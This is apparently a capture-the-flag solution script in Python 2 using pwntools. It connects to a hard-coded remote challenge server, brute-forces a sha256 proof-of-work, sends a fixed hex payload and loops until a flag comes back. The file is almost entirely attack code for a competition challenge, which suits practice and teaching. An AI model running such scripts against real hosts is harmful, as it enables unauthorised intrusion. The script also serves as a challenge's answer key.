__author__ = "polaris"
from pwn import *
import string
from hashlib import sha256
table = string.ascii_letters+string.digits

#p = remote("127.0.0.1",10002)
context.log_level = "debug"
def POW():
    p.recvuntil("sha256(XXXX+")
    suffix = p.recvn(16)
    print suffix
    p.recvuntil("== ")
    sha = p.recvn(64)
    for a in table:
        for b in table:
            for c in table:
                for d in table:
                    if sha256(a+b+c+d+suffix).hexdigest()==sha:
                        print a+b+c+d
                        p.sendline(a+b+c+d)
                        return 


error = ">.<"
flag = error

while flag==error:
    p = remote("34.92.185.118",10003)
    #p = remote("127.0.0.1",10003)
    POW()
    p.recvuntil("(hex): ")
    payload = "\x00\x05\x06\x08\x04\x00\x05\x06\x08\x3a"
    p.sendline(payload.encode("hex"))
    flag = p.recvline().strip()
    print flag
    raw_input()
    p.close()

p.interactive()
